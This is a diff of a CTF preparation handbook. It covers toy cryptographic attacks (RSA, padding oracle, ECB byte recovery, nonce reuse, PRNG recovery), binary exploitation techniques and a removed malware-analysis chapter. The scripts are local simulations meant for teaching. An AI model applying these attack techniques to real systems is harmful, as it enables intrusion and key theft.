-assert all(pow(recovered, e, modulus) == ci
-           for modulus, ci in zip(moduli, cs))
-print('broadcast:', recovered)
-```
-
-Small `e` alone is insufficient: padding or modular wraparound defeats the first check. The common-modulus script needs invertible ciphertexts for negative exponents; a failed inverse may expose a factor through GCD. Broadcast needs the same integer message and enough combined modulus size. Randomized padding breaks that assumption.
-
-### Textbook RSA multiplicativity
-
-Save as `rsa_blinding_toy.py`:
-
-```python
-from math import gcd
-
-p, q, e = 61, 53, 17
-n = p*q
-d = pow(e, -1, (p-1)*(q-1))
-message = 65
-ciphertext = pow(message, e, n)
-factor = 2
-assert gcd(factor, n) == 1
-modified = ciphertext * pow(factor, e, n) % n
-
-def toy_decrypt_oracle(c):
-    return pow(c, d, n)
-
-answer = toy_decrypt_oracle(modified)
-recovered = answer * pow(factor, -1, n) % n
-assert recovered == message
-print(recovered)
-```
-
-This models an oracle that refuses one ciphertext but decrypts related ciphertexts. Proper padding and protocol validation change the available oracle. Never assume a signing oracle accepts arbitrary integers; inspect hashing and encoding first.
-
-### RsaCtfTool without accidental online analysis
-
-On **Windows WSL**, locate the supplied RsaCtfTool entry point and read its local help. Inspect a PEM public key with the listed OpenSSL:
-
-```bash
-openssl pkey -pubin -in public.pem -text -noout
-```
-
-Expected fields include the modulus and exponent. Choose a local attack matching an observed property, such as close primes or shared factors. Do not launch an all-attacks mode without checking whether it includes network-backed factoring. If the entry point is absent, extract the numbers from supplied text and use the scripts above.
-
-## 7. Block modes: distinguish confidentiality from integrity
-
-For AES the block size is 16 bytes. ECB encrypts equal plaintext blocks to equal ciphertext blocks under the same key. CBC combines each plaintext block with the previous ciphertext block (or IV). CTR and OFB generate a stream that is XORed with plaintext.
-
-Save as `block_repetitions.py` and pass a raw ciphertext filename:
-
-```python
-from collections import Counter
-from pathlib import Path
-import sys
-
-data = Path(sys.argv[1]).read_bytes()
-for offset in range(16):
-    blocks = [data[i:i+16] for i in range(offset, len(data)-15, 16)]
-    repeats = sum(count-1 for count in Counter(blocks).values() if count > 1)
-    if repeats:
-        print('offset', offset, 'repeated blocks', repeats)
-```
-
-Repeated blocks are evidence of deterministic block behavior, not a complete ECB proof. File headers, duplicated chunks, and framing can create repetitions too. With a chosen-plaintext oracle, compare ciphertext for repeated aligned input blocks.
-
-### CBC bit flipping without an AES dependency
-
-The relation is `P_i = D(C_i) XOR C_(i-1)`. Changing the previous block by `old XOR wanted` changes the targeted plaintext bytes. The previous plaintext block is usually corrupted; changing the IV targets the first block without that side effect.
-
-Save as `cbc_relation.py`:
-
-```python
-def xor(a, b):
-    assert len(a) == len(b)
-    return bytes(x ^ y for x, y in zip(a, b))
-
-# A fixed hypothetical decrypted block D(C1), not an AES implementation.
-intermediate = bytes(range(16))
-original = b'admin=0;uid=1000'
-desired = b'admin=1;uid=1000'
-iv = xor(intermediate, original)
-modified_iv = xor(iv, xor(original, desired))
-assert xor(intermediate, iv) == original
-assert xor(intermediate, modified_iv) == desired
-print(xor(intermediate, modified_iv))
-```
-
-Expected output contains `admin=1`. An authenticated ciphertext should be rejected after modification. If a challenge uses a CRC instead of a MAC, analyze that CRC separately; arbitrary CRC updates do not bypass a real authentication tag.
-
-### ECB suffix recovery: runnable oracle rehearsal
-
-The following uses a deterministic block transform to demonstrate byte alignment and dictionary matching. It is not AES and is not a cryptographically secure encryption implementation. The same equality logic applies to a deterministic ECB oracle with a fixed unknown suffix.
-
-Save as `ecb_suffix_toy.py`:
-
-```python
-from hashlib import sha256
-
-BLOCK = 16
-secret = b'CTF{ecb_demo}'
-key = b'local toy key'
-
-def oracle(prefix):
-    data = prefix + secret
-    pad = BLOCK - len(data) % BLOCK
-    data += bytes([pad]) * pad
-    return b''.join(sha256(key + data[i:i+BLOCK]).digest()[:BLOCK]
-                    for i in range(0, len(data), BLOCK))
-
-base_length = len(oracle(b''))
-growth = next(i for i in range(1, BLOCK+1)
-              if len(oracle(b'A'*i)) > base_length)
-secret_length = base_length - growth
-known = b''
-for index in range(secret_length):
-    prefix = b'A' * (BLOCK-1-index % BLOCK)
-    block_index = index // BLOCK
-    start = block_index * BLOCK
-    target = oracle(prefix)[start:start+BLOCK]
-    matches = []
-    for candidate in range(256):
-        sample = oracle(prefix + known + bytes([candidate]))
-        if sample[start:start+BLOCK] == target:
-            matches.append(candidate)
-    assert len(matches) == 1
-    known += bytes([matches[0]])
-assert known == secret
-print(known)
-```
-
-Failure usually means a changing key, unknown prefix, randomized encryption, wrong block size, compression, or a query limit. Determine whether the prefix is fixed or changes per request before trying to align it. Do not send the toy loop to a remote service until its oracle model and allowed query budget are established.
-
-## 8. Padding and error oracles
-
-A CBC padding oracle reveals whether modified plaintext has valid padding. First distinguish padding rejection from authentication rejection, JSON parsing, UTF-8 decoding, or normal application errors. Repeat controls: one noisy error is insufficient.
-
-This complete local simulator recovers a 16-byte intermediate value using only a padding-validity function. Save as `padding_oracle_toy.py`:
-
-```python
-BLOCK = 16
-intermediate = bytes([91, 2, 77, 18, 200, 17, 9, 55, 66, 7, 33, 111, 8, 4, 3, 2])
-plain = b'CTF{oracle_demo}'
-assert len(plain) == BLOCK
-original_previous = bytes(a ^ b for a, b in zip(intermediate, plain))
-queries = 0
-
-def valid_padding(chosen_previous):
-    global queries
-    queries += 1
-    candidate = bytes(a ^ b for a, b in zip(intermediate, chosen_previous))
-    length = candidate[-1]
-    return 1 <= length <= BLOCK and candidate[-length:] == bytes([length])*length
-
-recovered = bytearray(BLOCK)
-for index in range(BLOCK-1, -1, -1):
-    pad = BLOCK-index
-    probe = bytearray(BLOCK)
-    for j in range(index+1, BLOCK):
-        probe[j] = recovered[j] ^ pad
-    found = []
-    for guess in range(256):
-        probe[index] = guess
-        if not valid_padding(probe):
-            continue
-        # Reject accidental padding longer than the intended suffix.
-        if index > 0:
-            probe[index-1] ^= 1
-            still_valid = valid_padding(probe)
-            probe[index-1] ^= 1
-            if not still_valid:
-                continue
-        found.append(guess ^ pad)
-    assert len(found) == 1, (index, found)
-    recovered[index] = found[0]
-
-result = bytes(a ^ b for a, b in zip(recovered, original_previous))
-assert bytes(recovered) == intermediate
-assert result == plain
-print(result, 'queries:', queries)
-```
-
-This simulates one block, not a network exploit. To adapt it, preserve the full protocol framing, determine which block is actually decrypted, and confirm that a MAC is not checked first. False positives at padding length 1 need the second probe shown above. UTF-8 or application-format oracles require different logic.
-
-RSA PKCS#1 v1.5 and OAEP-leading-byte oracles use multiplicative interval narrowing, not CBC byte flipping. Record the exact predicate before using a Bleichenbacher or Manger implementation from approved local crypto-attacks. See the advanced chapter for the distinction.
-
-## 9. Hashes, MACs, CRCs, and compression
-
-Hash length is not an algorithm identifier. Compare source, field names, encoding, salt placement, and known test values. A 32-character hex string might be MD5, a random token, or truncated output from another function.
-
-Length extension applies to constructions such as certain Merkle–Damgård hashes of `secret || message`. It does not apply to HMAC simply because HMAC uses the same hash internally. You need the original digest, original message, a secret-length hypothesis, and an application parser that accepts the required glue padding.
-
-**Kali:** hlextend is listed, but check its installed API locally before use:
-
-```bash
-python3 -c "import hlextend; help(hlextend)"
-```
-
-Start with a toy local verifier and verify the extended digest exactly before querying a challenge. Hash length extension does not decrypt a message and does not recover the secret.
-
-For a custom XOR-aggregate hash or linear MAC, express each known message/signature pair as equations over the correct field. CRC32 is affine for fixed conventions and message lengths; bit order, initial state, and final XOR matter. Compare equal-length messages and verify any proposed correction with the same CRC implementation.
-
-For compression side channels, measure compressed length before encryption noise if the interface permits. Keep secret context and chosen prefix adjacent, repeat samples, and compare candidates of equal input length. Padding, random prefixes, different compression dictionaries, and state resets can hide the signal.
-
-Collision and preimage are different goals. A collision for two chosen files is not a preimage for a fixed digest. A published SHA-1 collision pair does not automatically produce a chosen-prefix collision for an arbitrary challenge document.
-
-## 10. Diffie–Hellman and signature nonces
-
-For finite-field DH, record `p`, generator `g`, both public keys, and whether private keys persist. Check trivial generator values, group order factors, and validation of peer public values.
-
-Save as `dh_toy.py`:
-
-```python
-p, g, alice, bob = 1019, 2, 123, 456
-A, B = pow(g, alice, p), pow(g, bob, p)
-shared_a, shared_b = pow(B, alice, p), pow(A, bob, p)
-assert shared_a == shared_b
-print('shared:', shared_a)
-
-for bad_g in [0, 1, p-1]:
-    possibilities = {pow(bad_g, exponent, p) for exponent in range(1, 12)}
-    print('generator', bad_g, 'public possibilities', sorted(possibilities))
-assert {pow(p-1, exponent, p) for exponent in range(1, 12)} == {1, p-1}
-```
-
-Small-subgroup confinement needs an accepted low-order public value, a persistent secret, and an observable response that distinguishes candidate shared secrets. One oracle output with an ephemeral secret does not accumulate CRT information across sessions.
-
-For DSA/ECDSA, repeated nonce `k` can expose the private key. The modular arithmetic below is common to both signature equations, using a toy subgroup order. It does not generate an elliptic-curve point.
-
-Save as `nonce_reuse.py`:
-
-```python
-n = 1019
-private, nonce, r = 123, 77, 456
-h1, h2 = 100, 200
-s1 = pow(nonce, -1, n) * (h1 + r*private) % n
-s2 = pow(nonce, -1, n) * (h2 + r*private) % n
-recovered_nonce = (h1-h2) * pow(s1-s2, -1, n) % n
-recovered_private = (s1*recovered_nonce-h1) * pow(r, -1, n) % n
-assert recovered_nonce == nonce
-assert recovered_private == private
-assert s1*nonce % n == (h1+r*private) % n
-assert s2*nonce % n == (h2+r*private) % n
-print(recovered_nonce, recovered_private)
-```
-
-Use the subgroup order, not the curve field prime. Match the real message hash truncation. ECDSA low-s normalization may require trying sign variants. Validate the recovered private key against the published public key. Ed25519 uses different encoding and scalar derivation; do not paste ECDSA code into it unchanged.
-
-## 11. Predictable randomness
-
-Identify the generator and its output transformation. Record how many hidden draws occur between observations. Timestamp seeds, truncated outputs, floating-point conversion, rejection sampling, and modulo reduction change the attack.
-
-### LCG recovery and backward stepping
-
-Save as `lcg_recovery.py`:
-
-```python
-from math import gcd
-
-modulus, multiplier, increment = 1009, 65, 17
-states = [123]
-for _ in range(7):
-    states.append((multiplier*states[-1]+increment) % modulus)
-
-d1 = (states[1]-states[0]) % modulus
-d2 = (states[2]-states[1]) % modulus
-assert gcd(d1, modulus) == 1
-a = d2 * pow(d1, -1, modulus) % modulus
-c = (states[1]-a*states[0]) % modulus
-assert (a, c) == (multiplier, increment)
-assert all((a*x+c) % modulus == y for x, y in zip(states, states[1:]))
-previous = (states[1]-c) * pow(a, -1, modulus) % modulus
-assert previous == states[0]
-print('a, c, previous:', a, c, previous)
-
-# Unknown modulus: differences produce multiples of the modulus.
-diffs = [y-x for x, y in zip(states, states[1:])]
-candidate = 0
-for x, y, z in zip(diffs, diffs[1:], diffs[2:]):
-    candidate = gcd(candidate, abs(x*z-y*y))
-assert candidate % modulus == 0
-print('modulus multiple:', candidate)
-```
-
-The GCD may be a multiple of the modulus. Filter candidates using all observations and known bounds. If a difference is not invertible, solve the resulting congruence rather than discarding the case. Truncated outputs need a different model, often constraints or a lattice.
-
-### Time seeds and generator matching
-
-Bound the seed window using challenge timestamps; reproduce the exact language/runtime PRNG. Python `random`, libc `rand`, Java's LCG, and browser `Math.random` are not interchangeable. Use a known output sequence to verify the generator before testing a derived key.
-
-For MT19937, enough full consecutive outputs permit state reconstruction after undoing tempering. Python floating outputs combine parts of multiple draws; they are not full 32-bit words. A tool that expects 624 raw words cannot accept decimal floats unchanged.
-
-PCG, xorshift, xoroshiro, and xoshiro have distinguishable state transitions and output scramblers. Read constants and rotation amounts from source. Chaotic maps also depend on floating-point precision; mathematically similar real-valued recurrences can produce different byte streams.
-
-LFSR output is linear only when the observed output is a linear state function. Filtered or combined LFSRs require correlation, algebraic, or constraint techniques. See the advanced chapter for a tested Berlekamp–Massey example.
-
-## 12. A disciplined finish
-
-Check the recovered object in the original equation: re-encrypt plaintext, verify a signature, regenerate observed RNG outputs, or reproduce the tag. Plausible English is not enough. Keep the original bytes, parameters, solver assumptions, and a minimal script with assertions.
-
-If a solver stalls, reduce a toy instance first. Wrong endianness, the wrong modulus, row/column conventions, hidden random draws, noninvertible values, and incorrect oracle definitions are more common than missing brute-force capacity.
-
-The chapter merges the source skill overview, classic/historical ciphers, RSA, DH, PRNG, stream, modern-mode and MAC notes. Specialized topics continue in [Advanced cryptography](#14-advanced-crypto); every crypto source file has a disposition in the coverage manifest.
-
-
----
-
 <a id="08-binary-exploitation"></a>
 
+<a id="08-binary-exploitation--binary-exploitation-prove-the-primitive-then-build-the-chain"></a>
+
 # Binary exploitation: prove the primitive, then build the chain
+
+**Quick route:** [Short commands](#quickstart--crash-offset) · [Tool strengths and weaknesses](#tool-chooser--binary-exploitation). Use this chapter for deeper explanations.
 
 Binary exploitation begins after you can explain the vulnerable operation. “The program crashes” is an observation. “A negative index reads an eight-byte pointer before the array” is a primitive you can build on. Record what you control, where it lands, how much you can read or write, and which operation triggers the next step.
 
 Pwn is an advanced preparation topic: it is not one of the official categories identified for this event. Prioritize the listed categories first. These procedures concern local practice binaries and explicitly assigned challenge services only. The event's AI prohibition, approved-tool restrictions, and ban on public online analysis/compilation still apply.
+
+<a id="08-binary-exploitation--1-keep-the-two-environments-distinct"></a>
 
 ## 1. Keep the two environments distinct
 
@@ -3550,7 +5686,9 @@ r2 -v
 checksec --version
 ```
 
-Pwntools is not individually listed. Windows row 14 allows adding non-AI Python libraries, which can cover a non-AI library such as pwntools; this is not evidence that it is preinstalled, works with the supplied interpreter, or has its assembler/debugger dependencies. Do not infer a separate Kali installation permission from the Windows row. The main procedures below use standard-library Python, GDB, and approved static tools. No blanket installers are required.
+Pwntools is not individually listed as preinstalled. PDF p.5 permits adding non-AI libraries in either environment, but its interpreter, assembler and debugger dependencies still need checking; unlisted standalone apps need approval. The main routes use standard-library Python, GDB and listed static tools. [Package setup](#00-tool-rules--non-ai-python-package-checks).
+
+<a id="08-binary-exploitation--2-establish-the-exact-target-before-discussing-mitigations"></a>
 
 ## 2. Establish the exact target before discussing mitigations
 
@@ -3590,6 +5728,8 @@ Read the vulnerable function, not just the protection summary. On Kali, `r2 chal
 | CET/CFI | Returns or indirect calls may be checked | Determine which features are enabled and enforced in this process |
 
 No canary symbol does not prove every function is unprotected. No `GNU_STACK` entry does not prove an executable stack. A non-PIE executable does not fix the libc, heap, or stack addresses. A named mitigation is a constraint on a chain, not a complete exploitability verdict.
+
+<a id="08-binary-exploitation--3-first-build-a-reliable-input-harness"></a>
 
 ## 3. First build a reliable input harness
 
@@ -3648,6 +5788,8 @@ with socket.create_connection((args.host, args.port), timeout=3) as sock:
 
 The literal `b'> '` is this example's prompt: replace it with an observed prompt. This minimal helper returns all received bytes, including any bytes after the marker; a multi-stage protocol needs a retained receive buffer. Never assume one `recv()` equals one server message, and do not use `.strip()` on leaked binary pointers because whitespace bytes may be data.
 
+<a id="08-binary-exploitation--4-a-complete-data-only-exercise"></a>
+
 ## 4. A complete data-only exercise
 
 Before overwriting a return address, practice field layout and binary input. This intentionally vulnerable **wire-format** example accepts a client-controlled authorization field. It is fully defined C and does not rely on compiler-specific stack layout. Save as `record.c`.
@@ -3694,6 +5836,8 @@ Path('record.bin').write_bytes(payload)
 ```
 
 Expected output: `practice accepted`. The lesson is that a data-field change can meet the objective without code execution. For a real overflow, you must additionally prove how an input write reaches an adjacent field; this toy does not claim to demonstrate stack corruption.
+
+<a id="08-binary-exploitation--5-measure-an-overflow-rather-than-guessing-its-offset"></a>
 
 ## 5. Measure an overflow rather than guessing its offset
 
@@ -3759,6 +5903,8 @@ On x86-64, a noncanonical overwritten return pointer may fault at `ret` before R
 
 The generator uses a maximum length of 4096 with this alphabet. Do not compare its result with a different pattern generator's offset. After measuring offset `N`, send exactly `N` filler bytes plus a recognizable pointer-sized marker and stop before the vulnerable return. Confirm that the marker occupies the saved return slot. In an optimized frame, `buffer size + pointer size` is not a trustworthy formula.
 
+<a id="08-binary-exploitation--6-ret2win-calling-conventions-and-a-reproducible-builder"></a>
+
 ## 6. Ret2win, calling conventions, and a reproducible builder
 
 A ret2win chain is possible when a useful function already exists and the input can reach its call path. Determine the measured return offset, the function's actual address, its arguments, the canary status, and stack alignment. A function called `win` may still require a valid state or argument.
@@ -3811,6 +5957,8 @@ At a normal System V x86-64 function entry, the stack reflects the return addres
 | ARM A32 | r0–r3; link register and ARM/Thumb state matter |
 | AArch64 | x0–x7; link register x30 and 16-byte stack alignment matter |
 
+<a id="08-binary-exploitation--7-from-an-information-leak-to-rop"></a>
+
 ## 7. From an information leak to ROP
 
 For a dynamic libc chain, the sequence is usually: obtain a pointer into the exact library, subtract that symbol's offset, verify another address, then build the next call. A function's exported entry and a return address inside that function have different offsets.
@@ -3858,6 +6006,8 @@ address of a valid continuation
 
 Track every gadget's consumed stack bytes, register clobbers, memory reads/writes, and branch conditions. `ret2csu` needs the actual constructor gadgets and loop/cleanup conditions; newer binaries need not contain the familiar pair. A `pop rdx; pop rbx; ret` gadget needs both stack values. `puts()` is allowed to clobber caller-saved registers, so do not rely on a fixed RDX value afterward.
 
+<a id="08-binary-exploitation--stack-pivots-srop-and-dynamic-resolution"></a>
+
 ### Stack pivots, SROP, and dynamic resolution
 
 For `leave; ret`, `leave` sets SP from BP and pops a new BP; `ret` consumes the next word as PC. A fake frame therefore needs both words. Check that the new stack is writable, large enough, aligned, and still mapped when subsequent calls execute. A pivot using a 32-bit stack register can truncate a 64-bit address.
@@ -3865,6 +6015,8 @@ For `leave; ret`, `leave` sets SP from BP and pops a new BP; `ret` consumes the 
 SROP uses a kernel signal-return path to restore many registers from a frame. It requires a valid trigger, exact architecture/kernel frame layout, mapped stack, and a permitted next syscall. Merely serializing a frame or sending `/bin/sh` does not place that string at the pointer named in the frame. Modern shadow-stack enforcement must be investigated separately; the source's broad claim of a generic signal-frame bypass is not treated as an established recipe.
 
 `ret2dlresolve` forges dynamic-linker metadata. It needs a reachable resolver, correctly related symbol/string/relocation records, usable writable storage, and compatible binding/version rules. It is not a general bypass of Full RELRO. With vDSO/vsyscall or partial GOT redirection, first inspect the actual kernel-provided mapping and instruction bytes; historical fixed addresses and executable modes vary.
+
+<a id="08-binary-exploitation--8-format-strings-separate-a-leak-from-a-write"></a>
 
 ## 8. Format strings: separate a leak from a write
 
@@ -3894,6 +6046,8 @@ This computes counts only. A real payload must also account for literal bytes pr
 
 For GOT writes, prove the slot is writable and will be called with useful arguments. For saved frame or return-pointer writes, obtain the correct live stack address. A single-call leak-and-write cannot generally use a value learned from its own future output; special retargeting chains depend on argument evaluation order. Avoid copying `%n` generators without reconstructing that order.
 
+<a id="08-binary-exploitation--9-heap-work-starts-with-ownership-and-allocation-history"></a>
+
 ## 9. Heap work starts with ownership and allocation history
 
 Draw each object with fields and ownership. Then make a ledger for every menu action: requested size, actual chunk size when known, returned pointer, owner, free state, and whether any stale reference remains. A use-after-free is an access through a reference whose lifetime has ended. A double-free and an uninitialized pointer are different bugs even if they later lead to similar allocations.
@@ -3919,6 +6073,8 @@ gdb -nx -q -x /opt/tools/gef.py ./chall
 ```
 
 Use the installed extension's `help` to inspect supported heap commands. `-nx` skips local initialization; do not source peda, pwndbg, and GEF together. Plain GDB memory inspection remains the fallback.
+
+<a id="08-binary-exploitation--tcache-safe-linking-and-version-boundaries"></a>
 
 ### Tcache, safe-linking, and version boundaries
 
@@ -3955,6 +6111,8 @@ The normal allocator stopped using the traditional malloc/free hooks in glibc 2.
 
 Old writeups often promise “deterministic” behavior based on a particular heap layout. Treat that as a claim about the original challenge environment. Reproduce allocation order, libc build, and output handling before relying on it.
 
+<a id="08-binary-exploitation--10-file-structures-callbacks-and-modern-targets"></a>
+
 ## 10. FILE structures, callbacks, and modern targets
 
 FILE corruption can change what stdio reads, writes, or dispatches. It is useful when a write primitive reaches `_IO_FILE` fields or a program's `FILE *`. Start with a **data effect**, such as a controlled leak, before trying a control-flow effect.
@@ -3964,6 +6122,8 @@ Map the exact fields used by the next call: flags, buffer bounds, write/read poi
 The source's older fake-vtable attacks target old glibc. Later validation restricts acceptable vtable pointers; wide-data and legitimate-dispatch techniques have additional predicates and do not make all modern FILE objects interchangeable. “House of Apple” is a family label, not enough information to construct a working object.
 
 A null byte in stdin's buffer pointer may move the next input operation into the FILE object itself; demonstrate the resulting write range in the debugger. A stdout leak needs correct buffer-pointer relationships and an output trigger. TLS destructors, `atexit` lists, pointer mangling, and application callbacks each have distinct layouts and invocation rules. A `setcontext` address is not a universal pivot: inspect the exact code and which base register it expects.
+
+<a id="08-binary-exploitation--11-seccomp-and-constrained-shellcode"></a>
 
 ## 11. Seccomp and constrained shellcode
 
@@ -3990,6 +6150,8 @@ For each filter branch record architecture, syscall number, relevant argument, r
 Direct `open` treats `*` literally; glob expansion belongs to a shell. Do not put `/flag*` in a raw file-open payload and expect wildcard expansion. A seccomp rule allowing `openat` may still restrict directory descriptors or flags. If a descriptor is already open, using it can avoid an unavailable open call, but verify its identity and offset.
 
 For printable/alphanumeric/unique-byte shellcode, first list permitted bytes and execution permissions. Assemble locally with approved Kali NASM or an available approved assembly tool; inspect bytes and disassemble before execution. A small first-stage reader needs a valid destination, input descriptor, next control transfer, and enough remaining bytes for stage two. A `read` stub alone does not jump to the bytes it reads.
+
+<a id="08-binary-exploitation--12-integer-parser-vm-and-race-condition-primitives"></a>
 
 ## 12. Integer, parser, VM, and race-condition primitives
 
@@ -4023,6 +6185,8 @@ A large positive length can become negative or zero after narrowing. That is onl
 For custom VMs, separate guest memory from host state. A negative guest register index, unchecked dispatch index, truncated jump, or host-side `eval` can cross that boundary. Interpreter-level commands and language jail escapes have their own input rules; see the miscellaneous chapter when the main issue is a language sandbox rather than native memory.
 
 Race experiments should have a measurable win condition and an attempt budget. A sleep merely changes timing; it does not prove the intended interleaving. Save the input and trace for a successful trial. Do not present a rare one-off crash as a reliable primitive.
+
+<a id="08-binary-exploitation--13-kernel-and-windows-extensions-advanced-environment-specific"></a>
 
 ## 13. Kernel and Windows extensions: advanced, environment-specific
 
@@ -4059,6 +6223,8 @@ For **Windows native**, use approved x64dbg and HxD. Distinguish x86 SEH-chain t
 
 The source's WinDbg/MCP and token-stealing workflows are excluded here because the tools are unapproved and the agent integration conflicts with event rules. Windows privilege exercises require an explicitly supplied challenge VM; they are not workstation troubleshooting steps.
 
+<a id="08-binary-exploitation--14-audit-the-repository-scripts-before-adapting-them"></a>
+
 ## 14. Audit the repository scripts before adapting them
 
 The five original Python files are **templates with unresolved assumptions**, not ready-to-run solvers. They all depend on pwntools and target-specific runtime files. The command-focused replacements above cover input, binary packing, offset measurement, and leak arithmetic without that dependency.
@@ -4072,6 +6238,8 @@ The five original Python files are **templates with unresolved assumptions**, no
 | `ctf-pwn/scripts/srop_execve.py` | Serialize a signal frame after a real trigger | `arb_read_gen` actually uses execve frames; `/bin/sh` is not placed by merely sending it; all frame/gadget/stack addresses require proof |
 
 No original script was executed against a target in preparing this handbook. The source's broad success and reliability claims were not reproduced. Keep this distinction in your own notes as well.
+
+<a id="08-binary-exploitation--15-troubleshooting-by-the-first-failed-invariant"></a>
 
 ## 15. Troubleshooting by the first failed invariant
 
@@ -4095,1078 +6263,19 @@ Source map: `ctf-pwn/SKILL.md`, `ctf-pwn/attack-playbook.md`, `ctf-pwn/static-si
 
 ---
 
-<a id="09-malware"></a>
-
-# Malware analysis and configuration recovery
-
-The first objective is usually a small, concrete answer: a configuration value, decoded payload, encryption key, persistence location, or reconstructed conversation. Find the data flow that produces it before considering execution.
-
-## Approved analysis routes
-
-**Windows native:** HxD, x64dbg, dnSpyEx (Windows workbook rows 42, 40, 45). **WSL:** Python 3, objdump, strings, Ghidra, Volatility 3 (Windows rows 14, 17, 18, 29, 38). **Kali:** capa, FLOSS, oletools, jadx, pyinstxtractor-ng, YARA, strace/ltrace (Kali rows 26, 50, 105, 79, 118, 164, 145/90).
-
-Each approval applies to its listed environment. Use installed versions/help; optional rules, plugins, symbol files, and third-party unpackers are not automatically included. AI interfaces, public malware uploads, and online decompilers are prohibited by the [event rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/) and Unapproved rows 51–52. Dissect is explicitly unapproved (row 21), so the source's `dissect.cobaltstrike` recipe is not used here.
-
-## Static triage
-
-`sample.bin` is a local challenge-supplied file. Hash it and keep an untouched copy. **Windows PowerShell:**
-
-```powershell
-Get-FileHash -Algorithm SHA256 -LiteralPath .\sample.bin
-```
-
-**WSL:**
-
-```bash
-xxd -l 256 sample.bin
-strings -a -n 6 sample.bin > strings-ascii.txt
-strings -a -e l -n 6 sample.bin > strings-utf16.txt
-objdump -f sample.bin
-objdump -x sample.bin > headers.txt
-```
-
-**Kali**, if those corresponding tools are present:
-
-```bash
-file sample.bin
-capa sample.bin
-floss sample.bin
-```
-
-Expected result: architecture/file type, imports, section layout, interesting strings, and candidate capabilities. High entropy can mean compression, encryption, or ordinary media. A capability match is a lead, not proof that a function executed.
-
-Open a native binary in approved Ghidra. Run auto-analysis, search for the interesting string, inspect cross-references, and decompile its callers. Rename the decryptor and annotate key/IV/blob sources. Read assembly when decompiler types or control flow are misleading. Record whether integer operations wrap at 8, 16, or 32 bits.
-
-## Decode scripts without executing them
-
-Replacing `eval` with `print` does not neutralize code that runs before the eval. Extract literals and reproduce their transformations in a separate script. Do not dot-source a PowerShell file, import a suspicious Python module, or run `npm install` on a malicious package to inspect it.
-
-**Windows PowerShell**, decode only a copied `-EncodedCommand` value saved to `encoded.txt`:
-
-```powershell
-$encoded = (Get-Content -Raw -LiteralPath .\encoded.txt).Trim()
-$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
-Set-Content -LiteralPath .\decoded.ps1.txt -Value $decoded -Encoding UTF8
-```
-
-Expected result: readable UTF-16LE PowerShell text. If it is gibberish, check that you extracted only the literal, then inspect whether it was UTF-8 or compressed. Keep the `.txt` suffix to discourage accidental execution.
-
-For a Base64 layer containing gzip or zlib, **WSL**, save as `decode_layer.py`:
-
-```python
-from pathlib import Path
-import base64, zlib
-
-encoded = ''.join(Path('encoded.txt').read_text().split())
-raw = base64.b64decode(encoded, validate=True)
-Path('layer1.bin').write_bytes(raw)
-if raw.startswith(b'\x1f\x8b'):
-    mode = 31  # gzip wrapper
-elif len(raw) >= 2 and (raw[0]*256 + raw[1]) % 31 == 0 and raw[0] & 15 == 8:
-    mode = 15  # plausible zlib wrapper; still requires validation
-else:
-    print('no supported compression wrapper; inspect layer1.bin')
-    raise SystemExit
-dec = zlib.decompressobj(mode)
-out = dec.decompress(raw, 16_000_001)
-if len(out) > 16_000_000 or dec.unconsumed_tail:
-    raise ValueError('output limit reached')
-assert dec.eof, 'incomplete compressed stream'
-Path('layer2.bin').write_bytes(out)
-print('decoded bytes:', len(out), 'unused trailing bytes:', len(dec.unused_data))
-```
-
-For JS `String.fromCharCode`, parse only literal numeric arrays; `fromCharCode` emits UTF-16 code units rather than unrestricted Unicode codepoints. For `%xx`, use `urllib.parse.unquote_to_bytes`; JS `unescape` additionally handles `%uXXXX`. For Python literals use `ast.literal_eval`, not `eval`; marshal/code objects require version-aware disassembly and must not be executed.
-
-**Kali** beautification is available (row 82): `js-beautify suspicious.js -o readable.js`. Beautification preserves behavior; it is not a safety sandbox. Search for string tables, index rotations, function constructors, and decode chains, then lift just the pure transformations.
-
-## Packages, office macros, and trojanized plugins
-
-**Kali**, `7z` row 9 and oletools row 105:
-
-```bash
-7z l package.deb
-7z x package.deb -opackage-parts
-oleid document.docm
-olevba document.docm > macro-report.txt
-```
-
-Inspect `control.tar.*` for `preinst/postinst/prerm/postrm`; inspect data archive paths without running package installation. A plugin can hide activation code in an exception handler, setup hook, or import side effect. Compare with a supplied known-good release using **Kali Git**, row 56:
-
-```bash
-git diff --no-index -- known-good/plugin.py suspect/plugin.py
-```
-
-Exit code 1 means differences were found. Follow added network calls and decode wrappers. An offline custom-alphabet decoder, **WSL**:
-
-```python
-from pathlib import Path
-alphabet = '0123456789abcdefghijklmnopqrstuvwxyz-.'
-shift = 13  # derive from the sample
-encoded = Path('domain-encoded.txt').read_text().strip()
-assert all(c in alphabet for c in encoded)
-decoded = ''.join(alphabet[(alphabet.index(c)-shift)%len(alphabet)] for c in encoded)
-print(decoded)
-```
-
-For macro-encoded cells, preserve traversal order and reverse the exact arithmetic. If the macro stores `3*byte+78`, require `(value-78)%3 == 0` and result in `0..255` before writing bytes. This avoids silently accepting an incorrect formula. Do not enable the document's macros to obtain the output.
-
-## PE resources, .NET, and Python bundles
-
-Use `objdump -s -j .rdata sample.exe` in **WSL** for a selected PE section. In Ghidra, trace resource-loading APIs and the code that consumes the resource. If extracting with WSL non-AI `pefile`, distinguish RVA from file offset; `pe.get_data(rva,size)` performs that translation. Virtual-size padding and overlays are separate from raw section bytes.
-
-On **Windows**, open managed assemblies in dnSpyEx. Search for `FromBase64String`, cipher constructors, `Dns`, `TcpClient`, registry writes, and static initialization. Follow configuration fields to their decryptor; a plausible C2 string in resources can be a decoy. Export the encrypted bytes and key source as data, then decode locally.
-
-For an observed MD5-password + IV-prefixed AES-CBC construction, **WSL** with non-AI PyCryptodome permitted by Windows row 14:
-
-```python
-from pathlib import Path
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
-import hashlib
-
-password = Path('key-source.bin').read_bytes()  # exact bytes, no implicit stripping
-data = Path('encrypted-config.bin').read_bytes()
-assert len(data) >= 32 and (len(data)-16)%16 == 0
-key = hashlib.md5(password).digest()  # only if the sample uses MD5 digest bytes
-plain = unpad(AES.new(key,AES.MODE_CBC,iv=data[:16]).decrypt(data[16:]),16)
-Path('config.txt').write_bytes(plain)
-print(repr(plain))
-```
-
-Padding success alone has false positives. Verify structure, key names, lengths, and any authentication tag. A sample may use hexadecimal digest text instead of digest bytes. The historical LimeRAT recipe `MD5[:15] + MD5 + NUL` is one 32-byte derivation, not a universal LimeRAT rule; reproduce the exact decompiled byte-copy operations.
-
-**Kali** Python bundle tools (rows 118, 117, 152):
-
